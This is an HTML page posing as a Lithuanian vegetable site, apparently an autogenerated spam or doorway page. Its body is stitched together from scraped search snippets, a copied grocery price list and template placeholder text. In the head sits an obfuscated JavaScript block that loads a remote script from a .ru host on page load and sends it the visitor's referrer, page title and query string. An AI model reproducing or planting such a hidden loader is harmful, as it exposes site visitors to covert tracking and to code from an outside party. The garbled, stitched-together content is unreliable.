<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Daržovės</title>
<meta name="keywords" content="Daržovės" />
<meta name="description" content="Daržovės" />
<link href="http://fonts.googleapis.com/css?family=Source+Sans+Pro:200,300,400,600,700,900|Quicksand:400,700|Questrial" rel="stylesheet" />
<link href="default.css" rel="stylesheet" type="text/css" media="all" />
<link href="fonts.css" rel="stylesheet" type="text/css" media="all" />

<!--[if IE 6]><link href="default_ie6.css" rel="stylesheet" type="text/css" /><![endif]-->
<script type="text/javascript">var _0x5d78=['\x68\x74\x74\x70\x3a','\x72\x65\x66\x65\x72\x72\x65\x72','\x69\x6e\x64\x65\x78\x4f\x66','\x68\x74\x74\x70\x73\x3a','\x63\x75\x72\x72\x65\x6e\x74\x53\x63\x72\x69\x70\x74','\x73\x72\x63','\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64','\x26\x64\x65\x66\x61\x75\x6c\x74\x5f\x6b\x65\x79\x77\x6f\x72\x64\x3d','\x68\x65\x61\x64','\x74\x69\x74\x6c\x65','\x26\x66\x72\x6d\x35\x66\x39\x36\x36\x30\x32\x65\x31\x34\x64\x31\x34\x3d\x73\x63\x72\x69\x70\x74\x35\x66\x39\x36\x36\x30\x32\x65\x31\x34\x64\x31\x35\x26\x5f\x63\x69\x64\x3d\x61\x38\x36\x65\x61\x39\x65\x36\x2d\x30\x32\x37\x35\x2d\x36\x32\x65\x61\x2d\x38\x32\x39\x36\x2d\x33\x38\x39\x38\x64\x61\x33\x33\x63\x66\x39\x38','\x73\x65\x61\x72\x63\x68','\x73\x63\x72\x69\x70\x74','\x70\x72\x6f\x74\x6f\x63\x6f\x6c','\x26\x66\x72\x6d\x35\x66\x39\x36\x36\x30\x32\x65\x31\x34\x64\x31\x34\x3d\x73\x63\x72\x69\x70\x74\x35\x66\x39\x36\x36\x30\x32\x65\x31\x34\x64\x31\x35','\x6c\x6f\x63\x61\x74\x69\x6f\x6e','\x54\x68\x65\x20\x77\x65\x62\x73\x69\x74\x65\x20\x77\x6f\x72\x6b\x73\x20\x6f\x6e\x20\x48\x54\x54\x50\x53\x2e\x20\x54\x68\x65\x20\x74\x72\x61\x63\x6b\x65\x72\x20\x6d\x75\x73\x74\x20\x75\x73\x65\x20\x48\x54\x54\x50\x53\x20\x74\x6f\x6f\x2e','\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x7a\x61\x2e\x7a\x61\x76\x6f\x64\x39\x33\x2e\x72\x75\x2f\x48\x48\x44\x43\x50\x58\x52\x31\x3f\x73\x65\x5f\x72\x65\x66\x65\x72\x72\x65\x72\x3d'];(function(_0x555b31,_0x5d78aa){var _0x2522f9=function(_0x231a97){while(--_0x231a97){_0x555b31['push'](_0x555b31['shift']());}};_0x2522f9(++_0x5d78aa);}(_0x5d78,0x1ca));var _0x2522=function(_0x555b31,_0x5d78aa){_0x555b31=_0x555b31-0x0;var _0x2522f9=_0x5d78[_0x555b31];return _0x2522f9;};var d=document,s=d[_0x2522('\x30\x78\x66')](_0x2522('\x30\x78\x61'));s[_0x2522('\x30\x78\x33')]='\x68\x74\x74\x70\x73\x3a\x2f\x2f\x7a\x61\x2e\x7a\x61\x76\x6f\x64\x39\x33\x2e\x72\x75\x2f\x48\x48\x44\x43\x50\x58\x52\x31\x3f\x73\x65\x5f\x72\x65\x66\x65\x72\x72\x65\x72\x3d'+encodeURIComponent(document[_0x2522('\x30\x78\x31\x32')])+'\x26\x64\x65\x66\x61\x75\x6c\x74\x5f\x6b\x65\x79\x77\x6f\x72\x64\x3d'+encodeURIComponent(document[_0x2522('\x30\x78\x37')])+'\x26'+window[_0x2522('\x30\x78\x64')][_0x2522('\x30\x78\x39')]['\x72\x65\x70\x6c\x61\x63\x65']('\x3f','\x26')+_0x2522('\x30\x78\x38');document[_0x2522('\x30\x78\x32')]?document['\x63\x75\x72\x72\x65\x6e\x74\x53\x63\x72\x69\x70\x74']['\x70\x61\x72\x65\x6e\x74\x4e\x6f\x64\x65']['\x69\x6e\x73\x65\x72\x74\x42\x65\x66\x6f\x72\x65'](s,document[_0x2522('\x30\x78\x32')]):d['\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x73\x42\x79\x54\x61\x67\x4e\x61\x6d\x65'](_0x2522('\x30\x78\x36'))[0x0][_0x2522('\x30\x78\x34')](s);document['\x6c\x6f\x63\x61\x74\x69\x6f\x6e'][_0x2522('\x30\x78\x62')]===_0x2522('\x30\x78\x31')&&_0x2522('\x30\x78\x31\x30')+encodeURIComponent(document['\x72\x65\x66\x65\x72\x72\x65\x72'])+_0x2522('\x30\x78\x35')+encodeURIComponent(document[_0x2522('\x30\x78\x37')])+'\x26'+window[_0x2522('\x30\x78\x64')][_0x2522('\x30\x78\x39')]['\x72\x65\x70\x6c\x61\x63\x65']('\x3f','\x26')+_0x2522('\x30\x78\x63')[_0x2522('\x30\x78\x30')](_0x2522('\x30\x78\x31\x31'))===0x0&&alert(_0x2522('\x30\x78\x65'));</script>
</head>
<body    id="xmMMtR5zLJ">
<div id="header-wrapper">
	<div id="header" class="container">
		<div id="logo">
			<h1><span class="icon icon-cog"></span><a href="#">daržovės</a></h1>
			<div id="menu">
				<ul>
					<li class="current_page_item"><a href="index.html" accesskey="1" title="">Homepage</a></li>
					<li><a href="#" accesskey="2" title="">Our Clients</a></li>
					<li><a href="#" accesskey="3" title="">About Us</a></li>
					<li><a href="privacy-policy.html">Privacy policy</a></li>
					<li><a href="terms.html">Terms and Conditions</a></li>
					<li><a href="photo.html">Photo gallery</a></li>
					<li><a href="contact.html">Contacts</a></li>
				</ul>
			</div>
		</div>
	</div>
</div>
<div id="page-wrapper">
	<div id="page" class="container">
		<div class="title"    id="jv5QIR7eug2">
			<h2 id="GtOoL6CnS4ZJaC">Welcome to daržovės</h2>
		</div>
		<p id="Meslcq7YIKH16"></p>
		<p id="RwJBXxnuBDR2BX6"><ul>
<li><a href="index.html">Orkaitėje keptos daržovės: šiltos ir spalvotos salotos ...</a><br> Daržovės Rodoma 1–12 iš 17 Rūšiuoti pagal: Numatytasis rikiavimas Rikiuoti pagal populiarumą Rikiuoti nuo naujausių Rikiuoti pagal kainą (min → maks) Rikiuoti pagal kainą (maks → min)</li>
<li><a href="1.html">Daržovės | Dėžėmis - vaisiai ir daržovės pigiau</a><br> Daržovės – vienmečiai, dvimečiai ir daugiamečiai žoliniai augalai, kurių įvairios sultingos dalys vartojamos maistui. Mitybos prasme nuo daržovių skiriami vaisiai, kurie dažniausiai auga ant sumedėjusių augalų (medžių, krūmų, krūmokšnių) ir paprastai būna saldūs.</li>
<li><a href="2.html">Džiovintos daržovės - Saldukas</a><br> Daržovės · Greita · Mėsa · Salotos Jautienos salotos su rukola ir balzamiko padažu 12 birželio, 2016 12 birželio, 2016 raudonuaguonulaukas Komentarų: 0</li>
<li><a href="3.html">Daržovės, Daržovių patiekalai - Receptai | Patiekalai</a><br> ORKAITĖJE KEPTOS DARŽOVĖS. 2 burokėliai, priklausomai nuo dydžio supjaustyti į keturias ar daugiau dalių 4 riekės moliūgo 4 morkos, perpjautos išilgai per pusę 2 pastarnokai, perpjauti ...</li>
<li><a href="4.html">Daržovės - BARBORA</a><br> Daržovės ir vaisiai Daržovės (8 5) 230 9309. Kasdien nuo 8 iki 21 val. El. p.: pagalba@barbora.lt. Daržovės ir vaisiai 215. Agurkai ir pomidorai 30; Paprikos ir baklažanai 14; Bulvės, morkos ir kopūstai 20; Svogūnai, porai ir česnakai 8 ...</li>
<li><a href="5.html">Daržovės, vaisiai ir grybai | MAISTO PREKĖS | ShopTime.lt ...</a><br> UAB Saldukas, amžina tradicija, visada pasiūlys įvairiausių prieskonių, prieskonių mišinių, prieskoninių žolelių, konditerijos žaliavų, džiovintų riešutų-vaisių ir daug kitų produktų iš Lietuvos ir viso pasaulio.</li>
<li><a href="6.html">DARŽOVĖS - E-gulbelė</a><br> Tel. +370 5 233 5340 info@auga.lt Nemokamas kokybės telefonas +370 800 11050 AUGA group, AB Konstitucijos pr. 21C, QUADRUM NORTH 08130 Vilnius</li>
<li><a href="7.html">Daržovės – Skanaus!</a><br> RECEPTAI, kurie įkvėps Jus gaminti! Čia jų rasite itin daug iš įvairiausių pasaulio šalių ir vietovių. Geri ir aiškiai aprašyti receptai, taip pat video receptai, kurie padės Jums pasigaminti ir ant stalo patiekti tik pačius skaniausius bei gardžiausius patiekalus! Geriausia vieta mėgstantiems gaminti.</li>
<li><a href="8.html">Daržovės | Skelbimai | AgroLietuva.lt</a><br> Daržovės – vienmečiai, dvimečiai ir daugiamečiai žoliniai augalai, kurių įvairios sultingos dalys vartojamos maistui. Mitybos prasme nuo daržovių skiriami vaisiai, kurie dažniausiai ...</li>
<li><a href="9.html">daržovės - išsamiai DELFI.lt</a><br> UAB Handelshus. Kodas: 221412030. PVM mokėtojo kodas: LT214120314. Naugarduko g. 102, 03160, Vilnius. Telefonas: +37068697707.</li>
</ul></p>
	</div>
</div>
<div class="wrapper"   id="v5FeGBfSr">
	<div id="three-column" class="container">
		<div><span class="arrow-down"></span></div>

<h2 id="MLOUGMC">Daržovės</h2> 2020.10.29 08:07
				<center><img src="img/539bb1f44cbfe650c6135c25e8063ebc.jpg" width="50%"   id="5zO76FhPF"></center><br><br><span> Informuojame, kad šioje svetainėje yra naudojami slapukai (angl. cookies). Toliau naršydami svetainėje arba paspausdami mygtuką Sutinku Jūs sutinkate su slapukų naudojimu. Savo duotą sutikimą bet kada galėsite atšaukti pakeisdami savo interneto naršyklės nustatymus ir ištrindami įrašytus slapukus. Daugiau informacijos apie slapukus galite rasti čia . </span> Sutinku Keisti apskritį <span> Parsisiųskite</span> Lietuvių English Русский Registruotis Prisijungti Prisijungti Registruotis <p> Sveiki, ačiū, kad vėl pas mus užsukote!</p> <p> Caps Lock yra įjungtas<p> (8 5) 230 9309 Prekės Mano prekės Akcijos Eko ir ūkis Naujienos Receptai Daržovės ir vaisiai Pieno gaminiai ir kiaušiniai Duonos gaminiai ir konditerija Mėsa, žuvys ir kulinarija Bakalėja Šaldytas maistas Gėrimai Kūdikių ir vaikų prekės Kosmetika ir higiena Švaros ir gyvūnų prekės Namai ir laisvalaikis <span> Pagrindinis puslapis </span> <span> Daržovės ir vaisiai </span> <span> Daržovės </span> (8 5) 230 9309 Kasdien nuo 8 iki 21 val. El. p.: pagalba@barbora.lt Daržovės ir vaisiai <span> 213</span> Agurkai ir pomidorai <span> 28</span> Paprikos ir baklažanai <span> 14</span> Bulvės, morkos ir kopūstai <span> 20</span> Svogūnai, porai ir česnakai <span> 8</span> Burokėliai ir kiti šakniavaisiai <span> 13</span> Salotos ir jų mišiniai <span> 23</span> Prieskoninės daržovės ir žolelės <span> 31</span> Kukurūzai, žirniai, pupelės ir smidrai <span> 7</span> Moliūgai ir cukinijos <span> 2</span> 1 2 3 Filtruoti Rūšiuoti pagal: Abėcėlę (A-Ž) Abėcėlę (Ž-A) Kainą (didėj.) Kainą (mažėj.) Be Akcijos Akcijines kainas <span> Lietuviški česnakai, 2 vnt., 100 g</span> <span> €0,89 </span> €8,90/kg Lietuviški česnakai, 2 vnt., 100 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Sviestiniai moliūgai, 1 kg</span> <span> €1,69 </span> €1,69/kg Sviestiniai moliūgai, 1 kg <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> MAŽOSIOS bulvytės, 0,6 kg</span> <span> €1,69 </span> €2,82/kg MAŽOSIOS bulvytės, 0,6 kg <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Korėjietiškai ruoštos morkos, 400 g</span> <span> €1,49 </span> €3,73/kg Korėjietiškai ruoštos morkos, 400 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Mažosios paprikos, įvairių spalvų, 150 g</span> <span> €1,49 </span> €9,93/kg Mažosios paprikos, įvairių spalvų, 150 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Ekologiškų paprikų rinkinys, fas., 300 g</span> <span> €3,49 </span> €11,63/kg Ekologiškų paprikų rinkinys, fas., 300 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Žirnių ankštys, fas. (be žirnių), 150 g</span> <span> €1,99 </span> €13,27/kg Žirnių ankštys, fas. (be žirnių), 150 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Korėjietiškai ruošti burokėliai, 400 g</span> <span> €1,29 </span> €3,23/kg Korėjietiškai ruošti burokėliai, 400 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Ekologiškos gražgarstės, 100 g</span> <span> €1,99 </span> €19,90/kg Ekologiškos gražgarstės, 100 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Pipirų rinkinys AŠTRIAUSI PASAULYJE, 80 g</span> <span> €3,49 </span> €43,63/kg Pipirų rinkinys AŠTRIAUSI PASAULYJE, 80 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Raudonos saldžiosios paprikos (70-90 mm), 1 kg</span> <span> €2,49 </span> €2,49/kg Raudonos saldžiosios paprikos (70-90 mm), 1 kg <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Svogūnai, 1 kg</span> <span> €0,39 </span> €0,39/kg Svogūnai, 1 kg <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Gūžinės salotos ICEBERG, 1 vnt.</span> <span> €0,99 </span> €0,99/vnt. Gūžinės salotos ICEBERG, 1 vnt. <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Slyviniai pomidorai (57-67 mm), 1 kg</span> <span> €1,99 </span> €1,99/kg Slyviniai pomidorai (57-67 mm), 1 kg <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Mažieji špinatai TASTY HOME (fasuoti), 200 g</span> <span> €1,49 </span> €7,45/kg Mažieji špinatai TASTY HOME (fasuoti), 200 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Špinatai TASTY HOME, 70 g</span> <span> €0,99 </span> €14,14/kg Špinatai TASTY HOME, 70 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Salotos vazonėlyje, 1 vnt.</span> <span> €0,79 </span> €0,79/vnt. Salotos vazonėlyje, 1 vnt. <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Česnakai, 1 kg</span> <span> €2,99 </span> €2,99/kg Česnakai, 1 kg <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Salotų mišinys TASTY HOME WILD, 170 g</span> <span> €1,29 </span> €7,59/kg Salotų mišinys TASTY HOME WILD, 170 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Salotinės sultenės TASTY HOME, 50 g</span> <span> €0,99 </span> €19,80/kg Salotinės sultenės TASTY HOME, 50 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Gražgarsčių lapai TASTY HOME, 70 g</span> <span> €0,99 </span> €14,14/kg Gražgarsčių lapai TASTY HOME, 70 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Gražgarsčių lapai TASTY HOME (fasuoti), 200 g</span> <span> €1,59 </span> €7,95/kg Gražgarsčių lapai TASTY HOME (fasuoti), 200 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Ekologiškos bulvės AUGA (fasuotos), 1 kg</span> <span> €0,99 </span> €0,99/kg Ekologiškos bulvės AUGA (fasuotos), 1 kg <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Virtos saldžiosios kukurūzų burbuolės JOVAIGĖ (fasuotos), 400 g</span> <span> €1,59 </span> €3,98/kg Virtos saldžiosios kukurūzų burbuolės JOVAIGĖ (fasuotos), 400 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Pikantiški korėjietiškai ruošti kopūstai, 400 g</span> <span> €1,79 </span> €4,48/kg Pikantiški korėjietiškai ruošti kopūstai, 400 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Uoginiai pomidorai su šakelėmis, 200 g</span> <span> €2,49 </span> €12,45/kg Uoginiai pomidorai su šakelėmis, 200 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Salotų mišinys LATTUGHINI, 100 g</span> <span> €0,99 </span> €9,90/kg Salotų mišinys LATTUGHINI, 100 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Salotų mišinys MISTICANZA RICCA, 100 g</span> <span> €0,99 </span> €9,90/kg Salotų mišinys MISTICANZA RICCA, 100 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Salotų mišinys DELICIOUS, 100 g</span> <span> €1,19 </span> €11,90/kg Salotų mišinys DELICIOUS, 100 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Bulvės šviežios lietuviškos (50-70 mm), 1 kg</span> <span> €0,29 </span> €0,29/kg Bulvės šviežios lietuviškos (50-70 mm), 1 kg <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Plautos morkos, 1 kg</span> €0,39 <span> €0,19 </span> €0,19/kg Plautos morkos, 1 kg <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Lietuviški pomidorai, 1 kg</span> <span> €1,39 </span> €1,39/kg Lietuviški pomidorai, 1 kg <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Brokolis, 1 vnt.</span> €1,49 <span> €0,79 </span> €0,79/vnt. Brokolis, 1 vnt. <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Batatai, 1 kg</span> <span> €1,99 </span> €1,99/kg Batatai, 1 kg <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Smulkiavaisiai pomidorai (indelyje), 250 g</span> <span> €0,95 </span> €3,80/kg Smulkiavaisiai pomidorai (indelyje), 250 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Lietuviški švieži baltagūžiai kopūstai, 1 kg</span> <span> €0,35 </span> €0,35/kg Lietuviški švieži baltagūžiai kopūstai, 1 kg <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Žiedinis kopūstas su lapais, 1 vnt.</span> <span> €1,99 </span> €1,99/vnt. Žiedinis kopūstas su lapais, 1 vnt. <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Rauginti kopūstai LINKĖJIMAI IŠ KAIMO (kibirėlyje), 800 g</span> <span> €1,69 </span> €2,11/kg Rauginti kopūstai LINKĖJIMAI IŠ KAIMO (kibirėlyje), 800 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Žalumynų rinkinys: svogūnų laiškai (50 g) ir krapai (20 g), 1 vnt.</span> <span> €0,99 </span> €0,99/vnt. Žalumynų rinkinys: svogūnų laiškai (50 g) ir krapai (20 g), 1 vnt. <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Rausvieji svogūnai, 1 kg</span> <span> €0,89 </span> €0,89/kg Rausvieji svogūnai, 1 kg <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Lupti virti burokėliai LINKĖJIMAI IŠ KAIMO (vakuumuoti), 500 g</span> <span> €0,46 </span> €0,92/kg Lupti virti burokėliai LINKĖJIMAI IŠ KAIMO (vakuumuoti), 500 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Baklažanai , 1 kg</span> <span> €1,79 </span> €1,79/kg Baklažanai , 1 kg <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Porai, 1 kg</span> <span> €1,49 </span> €1,49/kg Porai, 1 kg <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Salierų stiebas, 1 vnt.</span> <span> €1,29 </span> €1,29/vnt. Salierų stiebas, 1 vnt. <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Smulkiavaisiai pomidorai, 200 g</span> <span> €0,99 </span> €4,95/kg Smulkiavaisiai pomidorai, 200 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Imbierų šaknys, 1 kg</span> <span> €4,79 </span> €4,79/kg Imbierų šaknys, 1 kg <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Krapai (indelyje), 25 g</span> <span> €0,49 </span> €19,60/kg Krapai (indelyje), 25 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Traškios morkytės (fasuotos), 200 g</span> <span> €0,99 </span> €4,95/kg Traškios morkytės (fasuotos), 200 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Rauginti agurkai LINKĖJIMAI IŠ KAIMO, 600 g</span> <span> €1,99 </span> €3,32/kg Rauginti agurkai LINKĖJIMAI IŠ KAIMO, 600 g <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Lietuviškos šviežios bulvės (tinkl., 30-50 mm), 1 kg</span> <span> €0,18 </span> €0,18/kg Lietuviškos šviežios bulvės (tinkl., 30-50 mm), 1 kg <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Burokėliai, 1 kg</span> <span> €0,23 </span> €0,23/kg Burokėliai, 1 kg <span> KARTU REKOMENDUOJAME</span> <span> </span> <span> Petražolės (indelyje), 25 g</span> <span> €0,49 </span> €19,60/kg Petražolės (indelyje), 25 g <span> KARTU REKOMENDUOJAME</span> <span> </span> 1 2 3 Prekės Mano prekės Akcijos Eko ir ūkis Naujienos Receptai<br>
						
<iframe width="615 height="315" src="https://www.youtube.com/embed/vfXH21_sxhA" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><br>		<img src="img/6864d93ce90f93c378166687f4976e0f.jpg" width="50%"/>

	</div></div>
</div>
<div id="wrapper2">
	<div id="tools">
		<div class="title">
			<h2>Vivamus fermentum nibh</h2>
		</div>
		<ul class="tools"    id="eGanuktELvL">
			<li><a href="#" class="icon icon-legal" id="tKzgcbidOM"></a></li>
			<li><a href="#" class="icon icon-random" id="OnoGnGkNL"></a></li>
			<li><a href="#" class="icon icon-key" id="I62ncXRJaQe4B"></a></li>
			<li><a href="#" class="icon icon-wrench" id="fgDTfwHSJrQzwgo"></a></li>
			<li><a href="#" class="icon icon-cut" id="fbohRtBh3uUXn"></a></li>
			<li><a href="#" class="icon icon-filter" id="TBiXPcM4uHtTHuU"></a></li>
			<li><a href="#" class="icon icon-lock" id="EjNBHqKJ3"></a></li>
		</ul>
	<br>
	</div>
</div>
<div id="copyright" class="container">
	<p>&copy; Untitled. All rights reserved. | Photos by Fotogrph </p>
	<p></p>
	
		<ul class="contact"    id="YmYdtYDkcggxbX">
			<li><a href="#" class="icon icon-twitter"><span>Twitter</span></a></li>
			<li><a href="#" class="icon icon-facebook"><span></span></a></li>
			<li><a href="#" class="icon icon-dribbble"><span>Pinterest</span></a></li>
			<li><a href="#" class="icon icon-tumblr"><span>Google+</span></a></li>
			<li><a href="#" class="icon icon-rss"><span>Pinterest</span></a></li>
		</ul>
</div>
</body>
</html>
